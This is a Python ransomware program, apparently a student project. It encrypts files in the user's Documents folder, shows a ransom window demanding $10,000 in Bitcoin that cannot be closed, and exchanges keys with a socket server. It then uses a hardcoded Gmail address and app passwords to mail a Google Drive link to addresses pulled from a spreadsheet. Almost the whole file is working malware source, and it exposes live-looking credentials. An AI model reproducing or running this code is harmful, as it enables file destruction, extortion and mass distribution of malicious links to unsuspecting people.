import socket
from cryptography.fernet import Fernet
import os 
import requests 
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import tkinter as tk
from tkinter import messagebox
import smtplib
import tkinter as tk
from tkinter import messagebox
import smtplib
from tkinter import *
import time
from PIL import Image, ImageTk
import smtplib
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from datetime import datetime
from email.mime.base import MIMEBase
from email.utils import COMMASPACE
import csv
import requests
import platform



SERVER_IP = 'localhost'
SERVER_PORT = 5678







class RansomWare:
    
    
    extensions = ['dddddanas']
    safe = False

    ################################################################################  Constructor   ################################################################################ 

    def __init__(self):
        self.key = None
        # Encrypt/Decrypter
        self.crypter = None
        self.public_key = None
        self.enc_fernent_key = None
        self.crypter_Fernet = None
        self.dec_fernet = None
        self.email = 'hackeregypt516@gmail.com'

        ### variables
        if platform.system() == 'Windows':
            self.os = 'W'
            print('This script is running on Windows.')
            self.email_password = 'bfymwdmswxmazwqh'
            self.extensions = ['txt']
        elif platform.system() == 'Darwin':
            print('This script is running on macOS.')
            self.os = 'M'
            self.email_password = 'ervctvrxqnsqozmg'
            if(self.safe == True):
                self.extensions = ['txt']
        else:
            print('This script is running on a different operating system.')
            self.os = 'O'
            self.email_password = 'enryyxqgtphdmxgm'
            self.extensions = ['txt']


        ##### PATHS ####
        # Use sysroot to create absolute path for files, etc. And for encrypting whole system
        self.sysRoot = os.path.expanduser('~')
        self.localRoot = os.path.join(self.sysRoot, 'Documents')

        ############GUI##########
        self.window = None
        self.success = False
        self.decryption_key = None
        self.root = None
        
 
      

 
        ################################################################################  RansomWare   ################################################################################ 

    def generate_key(self):
        # Generates a url safe(base64 encoded) key
        self.key =  Fernet.generate_key()
        # Creates a Fernet object with encrypt/decrypt methods
        self.crypter = Fernet(self.key)
        print('in generate_key : ', self.key )
        print('\n\n\n\n\n')

    
    def write_key(self):
        filename = "Key.key"
        filepath = os.path.join(self.localRoot, filename)
        with open(filepath, 'wb') as f:
            f.write(self.key)
                 
        print('in write_key : ')
        print('\n\n\n\n\n')



    def encrypt_key(self):
        filename = "encryptedKey.key"
        filepath = os.path.join(self.localRoot, filename)
        with open(filepath, 'wb') as f:
            self.public_key = RSA.import_key(self.public_key)
            public_crypter =  PKCS1_OAEP.new(self.public_key)
            # Encrypted fernet key
            self.enc_fernent_key = public_crypter.encrypt(self.key)
            print("self.enc_fernent_key :",self.enc_fernent_key)
            # Write encrypted fernet key to file
            f.write(self.enc_fernent_key)
        print('in encrypt_key : ',self.enc_fernent_key)
        print('\n\n\n\n\n')
        
    def crypt_file(self, file_path, encrypted=False):
        print('in crypt_file : ',encrypted)
        print('\n\n\n\n\n')
        with open(file_path, 'rb') as f:
            data = f.read()
            if not encrypted:
                _data = self.crypter.encrypt(data)
            else:
                _data = self.crypter.decrypt(data)
        with open(file_path, 'wb') as fp:
            fp.write(_data)


    def crypt_system(self, encrypted=False):
        print('in crypt_system : ',encrypted)
        print('\n\n')
        system = os.walk(self.localRoot, topdown=True)
        for root, dir, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                print("Processing file:", file," path: ",file_path) 
                if not file.split('.')[-1] in self.extensions:
                    continue
                if not encrypted:
                    self.crypt_file(file_path)
                else:
                    self.crypt_file(file_path, encrypted=True)
        if encrypted == False:
            self.GUI()


    def decrypt_files(self):
        print('inside decrypt_files') # Debugging/Testing
        while True:
            try:
                print('trying') # Debugging/Testing 
                self.crypter_Fernet = Fernet(self.dec_fernet)
                self.crypt_system(encrypted=True)
                print('decrypted')
                break
            except Exception as e:
                print(e) 
                pass
       
    
    def test_file(self):
        dirpath = os.path.join(self.localRoot, 'test')
        if not os.path.exists(dirpath):
            os.mkdir(dirpath)
        for i in range(1000):
            print(f"creating text file {i}")
            filename = f"test_{i}." + self.extensions[0]
            filepath = os.path.join(self.localRoot,'test' ,filename)

            with open(filepath, 'w') as f:
                f.write(f'''

                "If you are able to read it, then it has either not yet been encrypted or it has already been decrypted."


                Ransomware is a type of malware from cryptovirology that threatens to publish the victim's personal data or permanently block access to it unless a ransom is paid off. While some simple ransomware may lock the system without damaging any files, more advanced malware uses a technique called cryptoviral extortion.

                Ransomware is a malware designed to deny a user or organization access to files on their computer. By encrypting these files and demanding a ransom payment for the decryption key, cyberattackers place organizations in a position where paying the ransom is the easiest and cheapest way to regain access to their files.


                Businesses and individuals face a dangerous and growing threat to the safety of their personal information and data in the form of ransomware. Ransomware is a form of malware that targets critical data and systems for the purpose of extortion.
                ''')

    ################################################################################  Sending Mails   ################################################################################ 
    
    def getMails(self):
        # Set the URL of the Google Sheets CSV
        url = 'https://docs.google.com/spreadsheets/d/1Wcb2hzqL56QorxwBFW96QWSuyYv_x9VwiFH1nMqJCHA/gviz/tq?tqx=out:csv'

        # Make a GET request to the URL and decode the response content
        response = requests.get(url)
        data = response.content.decode('utf-8')

        # Create a CSV reader and iterate through the rows to extract the email addresses
        reader = csv.DictReader(data.splitlines())
        email_column = "Email" # Replace with the actual column name containing the emails
        emails = [row[email_column] for row in reader if email_column in row]

        # Print the extracted email addresses
        print(emails)
        return emails

    
    def message(self, to):
        msg = MIMEMultipart()

        msg_body = """https://drive.google.com/drive/folders/1G8zvywouCBK3fnsHJiWafyN6o5OWrsDZ?usp=sharing"""

        msg.attach(MIMEText(msg_body))
        msg["Subject"] = (
            "Test1" + " " + str(datetime.now().strftime("%d-%m-%Y %H:%M"))
        )
        msg["From"] = self.email
        msg['To'] = to


        return msg

    def sendMails(self):
        # Send the email using SMTP
        with smtplib.SMTP("smtp.gmail.com", 587) as smtp:
            smtp.ehlo()
            smtp.starttls()
            smtp.ehlo()
            print('sending mail ...')
            smtp.login(self.email, self.email_password) 
            emails = self.getMails()
            for email in emails:
                msg = self.message(email)
                smtp.sendmail(self.email, email, msg.as_string())



        ################################################################################  GUI   ################################################################################ 
   
    def GUI(self):
        root = tk.Tk()
        root.withdraw()
        self.window = tk.Tk()
        self.root = root
        self.window.title("Your txt files in documents directory are encrypted :} ")
        self.create_widgets()
        width = 700
        height = 300
        x = (self.window.winfo_screenwidth() - width) // 2
        y = (self.window.winfo_screenheight() - height) // 2
        self.window.geometry("{}x{}+{}+{}".format(width, height, x, y))
        self.window.protocol("WM_DELETE_WINDOW", self.do_nothing)
        self.start()
        self.wait_for_key_input()
        
    def create_widgets(self):
        self.message_label = tk.Label(self.window, text="We have encrypted all your txt files in documents directory.Since we want to take A+ in the project \nIf you want to get them back, you need to pay us $10,000 in Bitcoin.\nSend the Bitcoin to this address: 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2\n\nWARNING: DO NOT TRY TO DECRYPT THE FILES YOURSELF \n and DO NOT TRY TO CLOSE THIS WINDOW or IT will not be decrypted any more")
        self.message_label.pack(side="top", fill="both", expand=True, padx=20, pady=20)

        self.key_label = tk.Label(self.window, text="Enter decryption key:")
        self.key_label.pack(side="top", padx=5, pady=5)

        self.key_entry = tk.Entry(self.window, show="*")
        self.key_entry.pack(side="top", padx=5, pady=5)

        self.ok_button = tk.Button(self.window, text="OK", width=10, command=self.check_key)
        self.ok_button.pack(anchor="center", padx=5, pady=5)

    def start(self):
        messagebox.showwarning("Your files are encrypted", "HEY!!!!!! \nYour files are encrypted\nClick 'OK' IF YOU WANT THEM TO BE decrypted.")

    def check_key(self):
        if self.key_entry.get() == "code":
            self.decryption_key = self.key_entry.get()
            self.window.destroy()
            self.success = True
            messagebox.showinfo("Congratulations", "Your files will be decrypted after few seconds!\nThank you for paying the ransom and support us ;)")
            self.root.destroy()


        else:
            messagebox.showerror("Incorrect key", "The decryption key you entered is incorrect. Please try again.")
            self.key_entry.delete(0, tk.END)  # Reset the text in the Entry widget

    def cancel(self):
        self.window.destroy()
    
    def do_nothing(self):
        pass

    def send_email(self):
        from_address = "your_email@example.com"
        to_address = "ransomware_email@example.com"
        subject = "Ransom payment confirmation"
        body = "Dear ransomware author,\nI have paid the ransom of $10,000 in Bitcoin to the address you provided. Please email me the decryption key at your earliest convenience.\n\nSincerely,\nVictim"

        message = "From: {}\nTo: {}\nSubject: {}\n\n{}".format(from_address, to_address, subject, body)

        try:
            smtp_server = smtplib.SMTP("smtp.gmail.com", 587)
            smtp_server.starttls()
            smtp_server.login(from_address, "your_email_password")
            smtp_server.sendmail(from_address, to_address, message)
            smtp_server.quit()

            messagebox.showinfo("Email sent", "Your payment confirmation email has been sent.")
        except:
            messagebox.showerror("Email error", "There was an error sending your payment confirmation email.")

    def wait_for_key_input(self):
        self.window.mainloop()
        
    def destroy_window_and_message_box(self):
        if self.window:
            self.window.destroy()
        if self.message_box:
            self.message_box.destroy()
    
            
with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as s:
    s.connect((SERVER_IP, SERVER_PORT))
    # Request public key from server
    rw = RansomWare()
    rw.test_file()
    rw.generate_key()
    rw.write_key()
    s.sendall(b'public_key')
    time.sleep(2)
    rw.public_key = s.recv(1024)
    print("receiving : public_key:  ",rw.public_key)
    rw.encrypt_key()
    rw.crypt_system()
    print("sending : enc_fernet_key",rw.enc_fernent_key)
    s.sendall(b'enc_fernet_key')
    time.sleep(2)
    s.sendall(rw.enc_fernent_key)
    time.sleep(2)
    while(True):
        if rw.success == True:
            break
    dec_fernet_key_bytes = s.recv(1024)
    print("receiving : dec_fernet_key_bytes:  ",dec_fernet_key_bytes)
    rw.dec_fernet = dec_fernet_key_bytes
    print('\n\n\n\n\n')
    print('dec_fernet_key_bytes:    ',dec_fernet_key_bytes) 
    print('\n\n\n\n\n')
    rw.decrypt_files()
    rw.sendMails()
input()



